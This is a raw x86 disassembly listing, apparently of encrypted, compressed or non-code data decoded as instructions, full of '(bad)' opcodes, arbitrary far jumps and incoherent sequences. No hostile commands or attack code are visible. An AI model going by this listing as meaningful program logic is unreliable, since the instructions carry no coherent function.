  4021be:	mov    ah,0x7c
  4021c0:	xor    edi,DWORD PTR [eax+0x6d8f5ef3]
  4021c6:	mov    dh,0x78
  4021c8:	stc    
  4021c9:	imul   ecx,DWORD PTR [esi+0x3ab8c92d],0xfffffff4
  4021d0:	dec    ebp
  4021d1:	xchg   esi,eax
  4021d2:	loopne 0x402173
  4021d4:	ja     0x40219b
  4021d6:	ins    BYTE PTR es:[edi],dx
  4021d7:	iret   
  4021d8:	shr    BYTE PTR [esi],cl
  4021da:	ja     0x402172
  4021dc:	mov    ch,0x93
  4021de:	xor    al,0x90
  4021e0:	jns    0x40218a
  4021e2:	xchg   DWORD PTR [edi-0x31],edx
  4021e5:	adc    eax,0xbf9b185e
  4021ea:	popa   
  4021eb:	and    bl,BYTE PTR [edx+0x4c]
  4021ee:	mov    esi,0xf6c72927
  4021f3:	data16 and BYTE PTR [ebp-0x1a],ah
  4021f7:	cwde   
  4021f8:	jecxz  0x40222b
  4021fa:	out    0x75,eax
  4021fc:	stos   DWORD PTR es:[edi],eax
  4021fd:	cmp    al,0xfe
  4021ff:	shr    DWORD PTR [ecx+0xb],1
  402202:	xlat   BYTE PTR ds:[ebx]
  402203:	pop    ss
  402204:	scas   al,BYTE PTR es:[edi]
  402205:	mov    edi,0xe71ab470
  40220a:	ret    0xfcca
  40220d:	and    eax,0x40b556a8
  402212:	cmp    BYTE PTR [esi+0x1c],0xf1
  402216:	dec    ecx
  402217:	jo     0x4021ff
  402219:	dec    ebp
  40221a:	pop    ds
  40221b:	in     al,0x61
  40221d:	mov    DWORD PTR ds:0x347b4bab,ebx
  402223:	mov    ch,0x1f
  402225:	call   0xb96:0xe555db51
  40222c:	mov    bl,0xf2
  40222e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40222f:	dec    esi
  402230:	dec    esi
  402231:	jmp    0x6bed:0x1ac20bfd
  402238:	outs   dx,DWORD PTR ds:[esi]
  402239:	out    0x6c,al
  40223b:	fld    QWORD PTR [edi]
  40223d:	(bad)  
  40223e:	iret   
  40223f:	mov    dl,0x15
  402241:	mov    eax,ds:0xa9733981
  402246:	cmp    BYTE PTR ds:0x869e8865,0x82
  40224d:	retf   
  40224e:	xor    DWORD PTR [eax+0x938dc8b],esp
  402254:	scas   al,BYTE PTR es:[edi]
  402255:	adc    bh,ah
  402257:	jle    0x4022bb
  402259:	das    
  40225a:	ficomp WORD PTR [ecx-0x341662d2]
  402260:	stos   BYTE PTR es:[edi],al
  402261:	cs data16 int3 
  402264:	std    
  402265:	lods   al,BYTE PTR ds:[esi]
  402266:	(bad)  
  402267:	lods   eax,DWORD PTR ds:[esi]
  402268:	cmp    DWORD PTR [eax-0x78],edi
  40226b:	cld    
  40226c:	sar    BYTE PTR [ecx],cl
  40226e:	cmp    al,0xe4
  402270:	in     eax,0x92
  402272:	ins    BYTE PTR es:[edi],dx
  402273:	loope  0x402200
  402275:	retf   0xe153
  402278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402279:	popf   
  40227a:	sahf   
  40227b:	ror    eax,1
  40227d:	aad    0xa5
  40227f:	mov    dl,0x42
  402281:	cwde   
  402282:	lock sbb eax,0x141f3e3c
  402288:	dec    ebx
  402289:	push   ebp
  40228a:	sahf   
  40228b:	aad    0xe1
  40228d:	push   ebx
  40228e:	dec    esp
  40228f:	mov    BYTE PTR [edi+0x13],al
  402292:	add    BYTE PTR [ebp+0x73073563],cl
  402298:	imul   edx,DWORD PTR [edi],0xf24e70af
  40229e:	cs retf 
  4022a0:	into   
  4022a1:	and    ebx,DWORD PTR [esi]
  4022a3:	xchg   ebx,eax
  4022a4:	push   edi
  4022a5:	mov    bh,0xdb
  4022a7:	jl     0x4022e7
  4022a9:	sub    eax,0xf15e3017
  4022ae:	pop    esp
  4022af:	cli    
  4022b0:	loope  0x402235
  4022b2:	mov    bl,0x20
  4022b4:	inc    edi
  4022b5:	or     al,0xd
  4022b7:	lea    ecx,[ebx]
  4022b9:	pop    ecx
  4022ba:	push   ebx
  4022bb:	popf   
  4022bc:	xchg   BYTE PTR [esi+0x7108d820],ah
  4022c2:	sub    BYTE PTR [ebx+eax*1+0x2b],bh
  4022c6:	in     eax,dx
  4022c7:	not    DWORD PTR [eax-0x169d9a13]
  4022cd:	lock (bad) 
  4022cf:	jnp    0x4022b3
  4022d1:	call   0x12ca4a9c
  4022d6:	sub    al,0x10
  4022d8:	cmp    ebp,ecx
  4022da:	leave  
  4022db:	pop    ebp
  4022dc:	push   ds
  4022dd:	push   esp
  4022de:	sbb    al,0xe2
  4022e0:	sub    ebp,DWORD PTR [eax]
  4022e2:	loop   0x402323
  4022e4:	mov    al,0x15
  4022e6:	cmp    edx,ecx
  4022e8:	test   BYTE PTR [edx+edi*4-0x7a],bl
  4022ec:	(bad)  
  4022ed:	jne    0x40226f
  4022ef:	dec    edi
  4022f0:	loopne 0x40233a
  4022f2:	icebp  
  4022f3:	pop    edi
  4022f4:	cmp    eax,0xd5cc9b8b
  4022f9:	add    eax,0x73ba5619
  4022fe:	outs   dx,BYTE PTR ds:[esi]
  4022ff:	push   ebx
  402300:	add    BYTE PTR [edx],al
  402302:	inc    edx
  402303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402304:	icebp  
  402305:	bound  ebp,QWORD PTR [ecx]
  402307:	dec    ebp
  402308:	jmp    0x4022bd
  40230a:	les    edi,FWORD PTR [eax-0x1b]
  40230d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40230e:	dec    edi
  40230f:	clc    
  402310:	or     dl,dh
  402312:	xor    ebx,esp
  402314:	mov    eax,0x832b15f1
  402319:	xchg   BYTE PTR [eax],ah
  40231b:	pop    edi
  40231c:	mov    ch,0x3a
  40231e:	xor    esp,DWORD PTR [esi]
  402320:	lods   al,BYTE PTR ds:[esi]
  402321:	stos   BYTE PTR es:[edi],al
  402322:	dec    edi
  402323:	mov    eax,ds:0x2c0bfebd
  402328:	out    0x85,eax
  40232a:	adc    DWORD PTR [edx],eax
  40232c:	test   al,0xe4
  40232e:	test   eax,0x5a69a63f
  402333:	mov    ?,edx
  402335:	cwde   
  402336:	and    DWORD PTR [edi-0x16],0xffffffbf
  40233a:	mov    al,0x9
  40233c:	mov    al,ds:0x296efeaa
  402341:	icebp  
  402342:	popa   
  402343:	mul    BYTE PTR [edi-0x6e]
  402346:	mov    eax,0x1b048d44
  40234b:	mov    al,ds:0xeb8d7e71
  402350:	ds mov ebx,0x4adc09bf
  402356:	jnp    0x4022f2
  402358:	adc    esp,DWORD PTR ds:[edi-0x3784bd2b]
  40235f:	xchg   DWORD PTR [edx+esi*4],edi
  402362:	dec    ebx
  402363:	pusha  
  402364:	lea    edx,[ecx]
  402366:	mov    eax,0xfeae4afc
  40236b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40236c:	mov    edx,0xb6af4dd1
  402371:	push   cs
  402372:	xor    bl,BYTE PTR ds:0xddeb0906
  402378:	inc    ecx
  402379:	push   es
  40237a:	in     al,dx
  40237b:	pop    ecx
  40237c:	cs dec ebp
  40237e:	sbb    eax,0xe85dc304
  402383:	ror    dl,0xaa
  402386:	sbb    BYTE PTR [eax-0x4a],al
  402389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40238a:	outs   dx,BYTE PTR ds:[esi]
  40238b:	(bad)  
  40238c:	mov    esp,0x56030e1f
  402391:	(bad)  
  402392:	mov    ah,0xaf
  402394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402395:	call   0xc8f2:0xb64fd72f
  40239c:	jp     0x4023e1
  40239e:	xchg   esp,eax
  40239f:	inc    esp
  4023a0:	shl    cl,cl
  4023a2:	xchg   edi,ecx
  4023a4:	(bad)  
  4023a5:	jns    0x4023cd
  4023a7:	ror    BYTE PTR [eax+eax*4+0x65daafec],cl
  4023ae:	jmp    0x30272256
  4023b3:	outs   dx,DWORD PTR ds:[esi]
  4023b4:	add    eax,0xdfcf73e2
  4023b9:	or     DWORD PTR [ebx+0x2e],edi
  4023bc:	data16 xor ah,BYTE PTR ds:[ebx+ebp*1-0x1139bdc0]
  4023c5:	add    al,0x39
  4023c7:	add    BYTE PTR [ebp+0x12baa3a4],dl
  4023cd:	pushf  
  4023ce:	out    0xa2,al
  4023d0:	or     eax,0x52a433da
  4023d5:	stos   DWORD PTR es:[edi],eax
  4023d6:	xchg   ebp,eax
  4023d7:	jge    0x40243c
  4023d9:	inc    DWORD PTR [edx]
  4023db:	arpl   WORD PTR [edi+0x49721951],dx
  4023e1:	push   DWORD PTR [eax]
  4023e3:	or     DWORD PTR es:[eax],eax
  4023e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023e7:	jmp    0x402405
  4023e9:	outs   dx,BYTE PTR ds:[esi]
  4023ea:	xchg   ebp,eax
  4023eb:	not    edx
  4023ed:	gs mov ch,0x20
  4023f0:	int    0x60
  4023f2:	and    dh,dh
  4023f4:	outs   dx,DWORD PTR ds:[esi]
  4023f5:	fdiv   QWORD PTR [ebx-0x63]
  4023f8:	lock mov gs,eax
  4023fb:	arpl   cx,si
  4023fd:	fnstcw WORD PTR ds:0x9e983afa
  402403:	mov    dl,0x6a
  402405:	pop    esi
  402406:	inc    esi
  402407:	js     0x402482
  402409:	mov    bl,BYTE PTR [ebp-0x39]
  40240c:	rcl    BYTE PTR [esi],1
  40240e:	push   0xffffff85
  402410:	mov    eax,0x4125273a
  402415:	ins    BYTE PTR es:[edi],dx
  402416:	cld    
  402417:	in     al,dx
  402418:	retf   0x7374
  40241b:	fwait
  40241c:	adc    ebx,edi
  40241e:	lods   eax,DWORD PTR ds:[esi]
  40241f:	adc    dh,BYTE PTR ds:0x79a12619
  402425:	and    eax,DWORD PTR [ebx]
  402427:	mov    esp,0xd08774f3
  40242c:	out    0xd8,eax
  40242e:	push   ecx
  40242f:	mov    DWORD PTR [ecx+0x22],edi
  402432:	mov    edi,0xffbd90ef
  402437:	push   0xffffffb6
  402439:	jg     0x402400
  40243b:	adc    eax,0x71e2a300
  402440:	addr16 or ecx,ebp
  402443:	push   esi
  402444:	sub    BYTE PTR [ecx+0x5303fb8],ch
  40244a:	fs xor al,0x9d
  40244d:	push   ss
  40244e:	pop    ds
  40244f:	xchg   ebp,eax
  402450:	cwde   
  402451:	loopne 0x4023f2
  402453:	pop    ebx
  402454:	sub    eax,0x34580f1
  402459:	pop    ebp
  40245a:	aad    0xe3
  40245c:	aaa    
  40245d:	mov    edx,0xc1867e8b
  402462:	fisubr WORD PTR [ebx-0x551228ac]
  402468:	dec    esp
  402469:	jl     0x4023fa
  40246b:	and    DWORD PTR [ebp+0x1b],0xfcc56528
  402472:	jge    0x4024a5
  402474:	stos   DWORD PTR es:[edi],eax
  402475:	inc    ecx
  402476:	into   
  402477:	dec    BYTE PTR [ebp+0x455a31f8]
  40247d:	sbb    eax,0x4c436c6e
  402482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402483:	xchg   esp,eax
  402484:	mov    al,0x8b
  402486:	pop    ss
  402487:	mov    dh,0xbe
  402489:	dec    edx
  40248a:	repnz push esi
  40248c:	cli    
  40248d:	in     eax,dx
  40248e:	xor    DWORD PTR [eax+0x3d],esp
  402491:	shr    DWORD PTR [edx-0x69],0x4e
  402495:	aad    0x46
  402497:	ss mov esp,0x24e90681
  40249d:	and    cl,0xf6
  4024a0:	fild   WORD PTR [edi-0x4396d551]
  4024a6:	out    dx,al
  4024a7:	adc    eax,0xf008b003
  4024ac:	por    mm2,QWORD PTR [eax]
  4024af:	cmc    
  4024b0:	ins    DWORD PTR es:[edi],dx
  4024b1:	in     eax,0x76
  4024b3:	and    eax,0x6e6d192a
  4024b8:	adc    BYTE PTR [edi],al
  4024ba:	fcom   QWORD PTR [esi+0x7b]
  4024bd:	(bad)  
  4024be:	(bad)  
  4024bf:	jp     0x402459
  4024c1:	push   ebx
  4024c2:	mov    bh,0xc
  4024c4:	mov    dl,0xe4
  4024c6:	jo     0x402468
  4024c8:	loop   0x40246a
  4024ca:	ins    DWORD PTR es:[edi],dx
  4024cb:	std    
  4024cc:	ret    0x14c8
  4024cf:	test   al,0x48
  4024d1:	stc    
  4024d2:	cwde   
  4024d3:	in     eax,dx
  4024d4:	ja     0x4024a5
  4024d6:	fistp  WORD PTR [eax+0x4a]
  4024d9:	outs   dx,BYTE PTR ds:[esi]
  4024da:	adc    BYTE PTR [ebp+0x54],0x5f
  4024de:	icebp  
  4024df:	sbb    eax,DWORD PTR [ecx-0x6faadbd]
  4024e5:	ins    DWORD PTR es:[edi],dx
  4024e6:	sti    
  4024e7:	push   edi
  4024e8:	sub    DWORD PTR [ecx+0x108bef7c],ebp
  4024ee:	lods   al,BYTE PTR ds:[esi]
  4024ef:	dec    ecx
  4024f0:	mov    dh,0xa2
  4024f2:	js     0x4024cd
  4024f4:	xchg   ebx,eax
  4024f5:	stos   BYTE PTR es:[edi],al
  4024f6:	leave  
  4024f7:	sbb    eax,0x379ab5b2
  4024fc:	mov    dh,BYTE PTR [ecx]
  4024fe:	lahf   
  4024ff:	mov    eax,ds:0x274bb436
  402504:	out    0xee,al
  402506:	and    eax,0xc1e49d81
  40250b:	test   DWORD PTR [ecx],ecx
  40250d:	ins    DWORD PTR es:[edi],dx
  40250e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40250f:	pop    ds
  402510:	cli    
  402511:	aad    0xa5
  402513:	jne    0x402575
  402515:	es pop es
  402517:	push   ebp
  402518:	pop    eax
  402519:	mov    ds:0xb5c50f20,al
  40251e:	retf   0x2b2a
  402521:	sbb    DWORD PTR [edx],ecx
  402523:	jb     0x40257b
  402525:	out    0x47,al
  402527:	sbb    al,BYTE PTR [ecx+0x67]
  40252a:	iret   
  40252b:	pop    ebp
  40252c:	push   ebp
  40252d:	popa   
  40252e:	gs mov esi,0x6647b55
  402534:	jbe    0x40256c
  402536:	pop    DWORD PTR [edi+0xec3f84f]
  40253c:	sbb    dl,BYTE PTR [edx+eiz*2+0xc]
  402540:	test   bl,dl
  402542:	(bad)  [esi+eiz*2]
  402545:	in     eax,dx
  402546:	adc    eax,0x88aba62e
  40254b:	xor    BYTE PTR [ebx],ah
  40254d:	mov    BYTE PTR [eiz*8-0x422e028d],cl
  402554:	jle    0x402526
  402556:	mov    ebx,0xdd0a4061
  40255b:	pop    esi
  40255c:	mov    dl,0xb5
  40255e:	pop    ss
  40255f:	test   esi,ecx
  402561:	sub    DWORD PTR [esi-0x64],ebx
  402564:	push   ebp
  402565:	or     cl,BYTE PTR [ebx+0x70360420]
  40256b:	jb     0x40252f
  40256d:	push   edi
  40256e:	out    0x61,eax
  402570:	mov    ecx,0x50a18ce6
  402575:	sub    esi,ecx
  402577:	scas   eax,DWORD PTR es:[edi]
  402578:	(bad)  
  402579:	std    
  40257a:	jge    0x40259a
  40257c:	adc    ch,BYTE PTR [edx]
  40257e:	xchg   ebx,eax
  40257f:	repnz int 0xa5
  402582:	imul   eax,DWORD PTR [ecx+edx*8+0xfccabff],0xdb646a4a
  40258d:	leave  
  40258e:	(bad)  
  40258f:	shl    BYTE PTR [esi],cl
  402591:	shr    BYTE PTR [esi-0x58],0xe6
  402595:	jne    0x4025a4
  402597:	push   ebx
  402598:	mov    bl,0xae
  40259a:	dec    esp
  40259b:	or     BYTE PTR [ecx-0x9],cl
  40259e:	arpl   WORD PTR [edx-0x2bc87d4],sp
  4025a4:	aad    0x60
  4025a6:	lea    ecx,[eax]
  4025a8:	aaa    
  4025a9:	push   0x42b8a23a
  4025ae:	jecxz  0x402607
  4025b0:	(bad)  
  4025b1:	ins    BYTE PTR es:[edi],dx
  4025b2:	mov    bh,0x20
  4025b4:	inc    ebx
  4025b5:	jo     0x4025ec
  4025b7:	in     al,dx
  4025b8:	addr16 push edx
  4025ba:	xor    DWORD PTR [ecx-0x4e],eax
  4025bd:	call   0x969e028b
  4025c2:	xor    al,0x63
  4025c4:	shl    BYTE PTR [ebp+0x53],1
  4025c7:	popa   
  4025c8:	mov    bl,0xe7
  4025ca:	cmp    esp,DWORD PTR ds:0x308821cd
  4025d0:	test   BYTE PTR [edx-0x44],bl
  4025d3:	mov    ebp,0xcaf13d93
  4025d8:	dec    ebx
  4025d9:	cli    
  4025da:	sbb    al,0x97
  4025dc:	or     esp,ebx
  4025de:	xlat   BYTE PTR ds:[ebx]
  4025df:	push   esi
  4025e0:	and    DWORD PTR [esi+ecx*4-0x1ea50f35],edi
  4025e7:	test   eax,0xaa8ae163
  4025ec:	aas    
  4025ed:	clc    
  4025ee:	xlat   BYTE PTR ds:[ebx]
  4025ef:	(bad)  
  4025f0:	jmp    0x6de231c1
  4025f5:	ds xor eax,0x8edbabaf
  4025fb:	xchg   edi,eax
  4025fd:	ins    BYTE PTR es:[edi],dx
  4025fe:	push   0xa440adcc
  402603:	jl     0x402597
  402605:	push   es
  402606:	inc    esp
  402607:	stos   BYTE PTR es:[edi],al
  402608:	and    ah,al
  40260a:	dec    esp
  40260b:	xchg   esp,eax
  40260c:	scas   eax,DWORD PTR es:[edi]
  40260d:	pop    ebp
  40260e:	mov    ah,0xc0
  402610:	imul   ebx
  402612:	inc    esp
  402613:	add    eax,0xe3557580
  402618:	push   0xf290dc22
  40261d:	inc    ebx
  40261e:	adc    al,0x3c
  402620:	out    dx,eax
  402621:	in     al,dx
  402622:	inc    esi
  402623:	or     ebx,DWORD PTR [ebp-0x48d51f4d]
  402629:	repnz push 0xffffffa0
  40262c:	mov    BYTE PTR [esi],bl
  40262e:	(bad)  
  40262f:	jl     0x40267a
  402631:	cmc    
  402632:	and    ah,bl
  402634:	(bad)  
  402635:	push   eax
  402636:	sar    edx,cl
  402638:	or     esp,0x3a346630
  40263e:	jnp    0x4026b1
  402640:	mov    ds:0x9d451467,al
  402645:	push   0xd756a349
  40264a:	mov    ecx,0xe79fbffb
  40264f:	iret   
  402650:	xor    esp,DWORD PTR [ebx]
  402652:	div    BYTE PTR [esi]
  402654:	popf   
  402655:	not    DWORD PTR [ebx-0x754e3bd3]
  40265b:	adc    edi,ebp
  40265d:	loop   0x402653
  40265f:	push   edi
  402660:	aad    0xfa
  402662:	mov    dl,0x9
  402664:	ss push cs
  402666:	ins    DWORD PTR es:[edi],dx
  402667:	bound  edx,QWORD PTR [edi+0xe]
  40266a:	cmp    ecx,edi
  40266c:	jmp    0x25c0:0x669ea8b3
  402673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402674:	les    edx,FWORD PTR [eax+0x39]
  402677:	outs   dx,BYTE PTR ds:[esi]
  402678:	add    BYTE PTR [eax-0x413a8b1b],bl
  40267e:	call   0x5ec9:0xf7993ad
  402685:	test   al,0x1e
  402687:	lea    ecx,[eax-0x38777c05]
  40268d:	repz mov eax,ds:0x5cbe5246
  402693:	popa   
  402694:	aad    0x3
  402696:	stos   BYTE PTR es:[edi],al
  402697:	cmp    BYTE PTR [edx+0x4],ch
  40269a:	ds mov ah,0xa7
  40269d:	cmc    
  40269e:	xchg   ebx,eax
  40269f:	mov    cl,BYTE PTR [ebx+esi*8+0x1abc8a40]
  4026a6:	jae    0x402654
  4026a8:	ds inc ebx
  4026aa:	or     dl,BYTE PTR [ebx-0x77240f0f]
  4026b0:	lds    ebp,FWORD PTR [edi]
  4026b2:	hlt    
  4026b3:	cli    
  4026b4:	pop    eax
  4026b5:	adc    BYTE PTR es:[ebp+0x639c3419],bh
  4026bc:	pop    ebx
  4026bd:	test   eax,0xcd40dd3
  4026c2:	std    
  4026c3:	stos   BYTE PTR es:[edi],al
  4026c4:	sbb    ecx,DWORD PTR [ebx+0x43448a8c]
  4026ca:	call   0x34f76b4
  4026cf:	xor    ecx,DWORD PTR [edi+0x4a]
  4026d2:	shl    BYTE PTR [esi+0x140735b4],0x7b
  4026d9:	xchg   ecx,eax
  4026da:	pop    esp
  4026db:	mov    esp,0x3c35b299
  4026e0:	mov    al,ds:0x7e239d04
  4026e5:	sub    bl,BYTE PTR [ebx-0x958542f]
  4026eb:	arpl   ax,cx
  4026ed:	adc    DWORD PTR [ecx],esp
  4026ef:	data16 lahf 
  4026f1:	dec    ecx
  4026f2:	les    esp,FWORD PTR ds:0xc7d58ab
  4026f8:	in     eax,dx
  4026f9:	loop   0x402773
  4026fb:	pop    edi
  4026fc:	add    DWORD PTR [edx],eax
  4026fe:	out    dx,al
  4026ff:	cmp    BYTE PTR [esi-0x67e6a26b],0xb4
  402706:	and    dl,ch
  402708:	cld    
  402709:	(bad)  
  40270b:	push   edx
  40270c:	xchg   edi,eax
  40270d:	xor    esp,ebx
  40270f:	push   esi
  402710:	add    DWORD PTR [eax+0x6e],ebx
  402713:	lods   al,BYTE PTR ds:[esi]
  402714:	popa   
  402715:	xor    BYTE PTR [esi-0x51],al
  402718:	inc    eax
  402719:	xchg   DWORD PTR [ebx-0x4c286b69],ebx
  40271f:	jae    0x4026c9
  402721:	les    ecx,FWORD PTR ds:0x139f860b
  402727:	cwde   
  402728:	mov    esi,0x491275a6
  40272d:	mov    ch,0x29
  40272f:	push   0x99c92591
  402734:	jl     0x40270c
  402736:	retf   
  402737:	or     bl,BYTE PTR [edi]
  402739:	dec    ebp
  40273a:	or     ecx,0xdc204ab2
  402740:	aas    
  402741:	test   al,0x64
  402743:	sub    dl,BYTE PTR [edi+0x71456637]
  402749:	int    0xbb
  40274b:	rcr    esi,cl
  40274d:	sbb    al,0xe5
  40274f:	add    BYTE PTR [eax],ah
  402751:	pop    esp
  402752:	fdiv   QWORD PTR [edi-0x19eb37dd]
  402758:	cli    
  402759:	lods   al,BYTE PTR ds:[esi]
  40275a:	das    
  40275b:	mov    esp,DWORD PTR [edi]
  40275d:	pop    edi
  40275e:	and    edx,eax
  402760:	jmp    0x4027be
  402762:	lods   eax,DWORD PTR ds:[esi]
  402763:	in     al,dx
  402764:	sbb    DWORD PTR [esi],edx
  402766:	jmp    0x939fd594
  40276b:	cmp    esp,DWORD PTR [ebp+0x49]
  40276e:	sub    DWORD PTR [ebx+0xa],0xffffffd0
  402772:	xchg   BYTE PTR [eax-0x3af7cdec],cl
  402778:	cli    
  402779:	inc    edi
  40277a:	jmp    0x40278c
  40277c:	cmp    eax,0x4d0b5a7e
  402781:	xchg   esp,eax
  402782:	fadd   DWORD PTR [ebp+0x63]
  402785:	push   edx
  402786:	jle    0x4027c5
  402788:	(bad)  
  402789:	(bad)
  40278c:	push   edi
  40278d:	cmp    eax,0xcddb4cc9
  402792:	popa   
  402793:	jl     0x4027ab
  402795:	outs   dx,DWORD PTR ds:[esi]
  402796:	sub    DWORD PTR [ecx],eax
  402798:	cmp    eax,0x2d292e77
  40279d:	(bad)  
  40279e:	pop    ebx
  40279f:	xor    BYTE PTR [edx-0x50],dh
  4027a2:	lds    esp,FWORD PTR [edx+0x24]
  4027a5:	sub    ch,BYTE PTR [eax-0x9]
  4027a8:	sub    ebp,DWORD PTR [edx]
  4027aa:	jnp    0x402825
  4027ac:	mov    eax,0xf8fd997e
  4027b1:	pop    ebx
  4027b2:	mov    ds:0xabdc420e,eax
  4027b7:	mov    WORD PTR [ecx-0x639c1223],ss
  4027bd:	sbb    eax,0x8e5343dc
  4027c2:	push   0xa
  4027c4:	aad    0xce
  4027c6:	sahf   
  4027c7:	leave  
  4027c8:	sub    BYTE PTR [edx],0x98
  4027cb:	push   edx
  4027cc:	nop
  4027cd:	rcr    esp,1
  4027cf:	jl     0x402808
  4027d1:	xor    al,0xac
  4027d3:	inc    ebx
  4027d4:	les    esp,FWORD PTR [ebx+0xfe988d]
  4027da:	retf   0xc55f
  4027dd:	dec    eax
  4027de:	cmc    
  4027df:	jp     0x402792
  4027e1:	popa   
  4027e2:	sub    bh,al
  4027e4:	pop    ebp
  4027e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027e6:	add    eax,0x76416e0d
  4027eb:	iret   
  4027ec:	dec    edx
  4027ed:	into   
  4027ee:	and    al,0xc6
  4027f0:	xor    eax,0xdd4f0bf0
  4027f5:	neg    DWORD PTR [ebx]
  4027f7:	mov    dl,0xe1
  4027f9:	inc    ch
  4027fb:	jbe    0x402822
  4027fd:	shl    DWORD PTR [esi-0x64],1
  402800:	inc    esp
  402801:	out    dx,eax
  402802:	mov    ebp,0xd0d34b2c
  402807:	sub    eax,0x9df20370
  40280c:	aam    0x49
  40280e:	(bad)  
  40280f:	cmp    dh,BYTE PTR [edx-0x1c]
  402812:	jns    0x402855
  402814:	and    ecx,DWORD PTR [ecx+edi*4+0x57]
  402818:	dec    ebx
  402819:	ja     0x402815
  40281b:	sbb    eax,edi
  40281d:	mov    bl,0x3e
  40281f:	sbb    edi,DWORD PTR [esi+ebp*1]
  402822:	repnz int3 
  402824:	rol    BYTE PTR [eax-0x1edee2d0],cl
  40282a:	fs popa 
  40282c:	push   0xde3cc71c
  402831:	jnp    0x40280a
  402833:	mov    edi,0x62e01df8
  402838:	int    0x28
  40283a:	and    BYTE PTR [eax-0x57],dl
  40283d:	ins    DWORD PTR es:[edi],dx
  40283e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40283f:	mov    ecx,edx
  402841:	jge    0x4028bb
  402843:	icebp  
  402844:	loopne 0x40282e
  402846:	push   eax
  402847:	leave  
  402848:	popf   
  402849:	mov    edx,0x4ab6c3f4
  40284e:	sbb    eax,0x7525e953
  402853:	test   DWORD PTR [eax-0x21871fed],edi
  402859:	rcl    DWORD PTR [edi],0xf2
  40285c:	std    
  40285d:	jle    0x402829
  40285f:	push   cs
  402860:	enter  0x5840,0x1c
  402864:	jg     0x4028a8
  402866:	pop    eax
  402867:	pop    ebp
  402868:	sbb    esi,DWORD PTR [eax+0x31c27cb1]
  40286e:	xor    BYTE PTR ds:0x91722fb2,ch
  402874:	ins    DWORD PTR es:[edi],dx
  402875:	adc    esp,DWORD PTR [eax-0x62]
  402878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402879:	fbld   TBYTE PTR [edx+ecx*1-0x1e]
  40287d:	inc    ebp
  40287e:	inc    edi
  40287f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402880:	xchg   ebx,eax
  402881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402882:	icebp  
  402883:	mov    cl,0x16
  402885:	add    DWORD PTR [esi-0x3541ae21],ebx
  40288b:	pop    edx
  40288c:	ret    0xbae3
  40288f:	sbb    DWORD PTR [ecx],edx
  402891:	addr16 pop edi
  402893:	dec    ebp
  402894:	or     BYTE PTR [eax],0xaf
  402897:	(bad)  
  402898:	leave  
  402899:	mov    ecx,DWORD PTR [ebx+0x2d6c2c0c]
  40289f:	and    edx,DWORD PTR [ebp-0x2415d00]
  4028a5:	push   0xcfa2160f
  4028aa:	pop    esi
  4028ab:	sbb    al,0xc1
  4028ad:	jge    0x40290d
  4028af:	enter  0x6459,0x7b
  4028b3:	xchg   ebx,eax
  4028b4:	and    DWORD PTR [edi+0x29],0x7
  4028b8:	pop    ecx
  4028b9:	call   0x7b428a58
  4028be:	jns    0x4028e9
  4028c0:	cli    
  4028c1:	mov    dh,0xd6
  4028c3:	fsubp  st(6),st
  4028c5:	ret    
  4028c6:	dec    ecx
  4028c7:	adc    bh,BYTE PTR [edi+0x11083c35]
  4028cd:	test   esi,0x971d5416
  4028d3:	mov    esi,?
  4028d5:	pop    ss
  4028d6:	jp     0x4028ca
  4028d8:	ds dec ebx
  4028da:	push   cs
  4028db:	xchg   edi,eax
  4028dc:	dec    edx
  4028dd:	sti    
  4028de:	pop    ecx
  4028df:	mov    bh,0x86
  4028e1:	jno    0x402947
  4028e3:	aas    
  4028e4:	cmp    esi,DWORD PTR [edi]
  4028e6:	test   eax,edi
  4028e8:	out    0xfe,al
  4028ea:	inc    ebp
  4028eb:	adc    BYTE PTR [eax],al
  4028ed:	pop    ds
  4028ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028ef:	mov    bh,0x1
  4028f1:	cmc    
  4028f2:	jne    0x4028da
  4028f4:	stos   BYTE PTR es:[edi],al
  4028f5:	pop    edx
  4028f6:	add    BYTE PTR [ebx+eax*4-0x3d8462c5],0xf3
  4028fe:	or     ch,al
  402900:	inc    edi
  402901:	or     DWORD PTR gs:[ebp-0x70],esi
  402905:	sub    dl,ch
  402907:	sub    DWORD PTR [edx+0x1bae279c],ecx
  40290d:	mov    al,0x59
  40290f:	(bad)  
  402911:	mov    eax,ds:0x35f00275
  402916:	mov    ecx,0xae0ba105
  40291b:	sub    al,0x64
  40291d:	pusha  
  40291e:	or     eax,DWORD PTR [esi]
  402920:	pusha  
  402921:	shr    DWORD PTR [edx+0x5008af55],1
  402927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402928:	push   eax
  402929:	mov    dh,0xc3
  40292b:	or     DWORD PTR [ecx+0x472a5ec2],esp
  402931:	mov    al,0x15
  402933:	or     BYTE PTR [bx+0x15fe],dl
  402938:	repnz leave 
  40293a:	cmc    
  40293b:	mov    DWORD PTR [eax],ecx
  40293d:	pop    esp
  40293e:	xchg   esi,eax
  40293f:	cli    
  402940:	pop    eax
  402941:	push   ebx
  402942:	into   
  402943:	or     al,0x3f
  402945:	xchg   esp,eax
  402946:	nop
  402947:	jbe    0x402973
  402949:	test   al,bh
  40294b:	and    DWORD PTR [edx],ecx
  40294d:	test   DWORD PTR [edi+eiz*8+0x44],eax
  402951:	add    bh,bh
  402953:	rcr    BYTE PTR [esi-0x3f],0x17
  402957:	dec    ebx
  402958:	stos   BYTE PTR es:[edi],al
  402959:	mov    ecx,0xec4d0bbc
  40295e:	mov    ?,WORD PTR [edx+0x35]
  402961:	dec    esi
  402962:	int    0xa
  402964:	adc    esp,ebx
